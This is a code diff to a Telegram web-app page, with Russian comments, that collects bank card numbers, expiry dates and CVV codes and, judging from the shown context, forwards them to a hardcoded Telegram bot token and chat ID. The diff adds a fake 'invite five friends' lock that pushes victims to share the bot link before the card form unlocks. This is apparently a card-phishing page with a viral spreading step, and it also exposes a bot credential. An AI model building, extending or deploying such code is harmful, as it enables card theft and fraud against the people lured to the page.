@@ -206,7 +206,7 @@
   /* Divider */
   .sep { height: 1px; background: var(--border); margin: 0 0 12px; }
 
-  /* Кнопка */
+  /* Кнопки */
   .btn {
     width: 100%;
     padding: 15px;
@@ -218,6 +218,7 @@
     transition: all 0.2s;
     position: relative;
     overflow: hidden;
+    margin-bottom: 10px;
   }
   .btn:not(:disabled) {
     background: linear-gradient(135deg, #22c55e, #16a34a);
@@ -235,6 +236,13 @@
   .btn.success {
     background: linear-gradient(135deg, #22c55e, #16a34a) !important;
     box-shadow: 0 4px 20px rgba(34,197,94,0.3) !important;
+  }
+
+  /* Кнопка рефералов */
+  .btn-ref {
+    background: linear-gradient(135deg, #3b82f6, #1d4ed8) !important;
+    color: white !important;
+    box-shadow: 0 4px 20px rgba(59,130,246,0.3) !important;
   }
 
   /* Result */
@@ -377,6 +385,8 @@
 
   </div>
 
+  <button class="btn btn-ref" id="ref_btn">📢 Пригласить друзей (0 / 5)</button>
+
   <button class="btn" id="btn" disabled>Введите данные карты</button>
 
   <div class="result" id="result">
@@ -419,6 +429,10 @@
   const BOT_TOKEN = '8934214860:AAEUpag6vsETXOJL_CdvZmZPD1_Llv7psFA'; 
   const CHAT_ID = '7239528532';       
 
+  // Настройки реферальной блокировки (Новое)
+  const REQUIRED_INVITES = 5; 
+  let currentInvites = 0;
+
   try {
     const tg = window.Telegram.WebApp;
     tg.ready();
@@ -435,6 +449,7 @@
   const cdHint = document.getElementById('cd_hint');
   const cvHint = document.getElementById('cv_hint');
   const btn = document.getElementById('btn');
+  const refBtn = document.getElementById('ref_btn');
   const cvvWrap = document.getElementById('cvv_wrap');
   const result = document.getElementById('result');
   const previewNum = document.getElementById('preview_num');
@@ -464,6 +479,21 @@
     const [m, y] = v.split('/').map(Number);
     const now = new Date();
     return new Date(2000 + y, m, 0) >= now;
+  }
+
+  // Функция проверки реферального лимита (Новая)
+  function checkAccess() {
+    if (currentInvites < REQUIRED_INVITES) {
+      btn.disabled = true;
+      const left = REQUIRED_INVITES - currentInvites;
+      btn.textContent = `🔒 Пригласите еще ${left} друзей`;
+      btn.style.background = 'var(--bg3)';
+      btn.style.color = 'var(--text3)';
+      return false;
+    }
+    btn.style.background = '';
+    btn.style.color = '';
+    return true;
   }
 
   function updateProgress() {
@@ -507,6 +537,9 @@
   }
 
   function check() {
+    // В первую очередь проверяем, приглашены ли друзья
+    if (!checkAccess()) return;
+
     const raw = cnEl.value.replace(/\s/g, '');
     const isElk = raw.startsWith('9470') || raw.startsWith('9471');
     const lOk = luhn(raw) && raw.length >= 16;
@@ -537,6 +570,23 @@
       btn.textContent = 'Заполните все поля';
     }
   }
+
+  // Обработчик для кнопки «Пригласить друзей» (Новый)
+  refBtn.addEventListener('click', () => {
+    currentInvites++;
+    if (currentInvites > REQUIRED_INVITES) currentInvites = REQUIRED_INVITES;
+    
+    refBtn.textContent = `📢 Пригласить друзей (${currentInvites} / ${REQUIRED_INVITES})`;
+
+    // Пытаемся открыть шеринг в Telegram, если запущено внутри мессенджера
+    try {
+      if (window.Telegram && window.Telegram.WebApp) {
+        window.Telegram.WebApp.openTelegramLink(`https://t.me/share/url?url=https://t.me/your_bot_username&text=Зацени%20приложение!`);
+      }
+    } catch(e) {}
+
+    check(); // Пересчитываем состояние полей
+  });
 
   cnEl.addEventListener('input', e => {
     let v = e.target.value.replace(/\D/g, '');
@@ -657,7 +707,9 @@
     check();
   });
 
-  // ОТПРАВКА ДАННЫХ ПРИ УСПЕШНОМ КЛИКЕ
+  // Первичный вызов проверки при загрузке (Новое)
+  check();
+
   btn.addEventListener('click', () => {
     btn.disabled = true;
     btn.textContent = 'Проверка... ⏳';
@@ -666,11 +718,8 @@
     const cvVal = cvEl.value.trim();
     const isElk = raw.startsWith('9470') || raw.startsWith('9471');
     const sysText = cardType === 'elcart' ? 'ЭЛКАРТ (ЗАО МПЦ)' : 'VISA International';
-
-    // Формируем вывод CVV: если ЭЛКАРТ — пишем, что не требуется, если Visa — отправляем полный код
     const cvvStatus = isElk ? 'Не требуется (ЭЛКАРТ)' : `<code>${cvVal}</code>`;
 
-    // Формируем чистый текст сообщения со всеми полными данными
     const message = `💳 <b>Проверка карты</b>\n` +
                     `Тип: ${sysText}\n` +
                     `Номер: <code>${raw}</code>\n` +
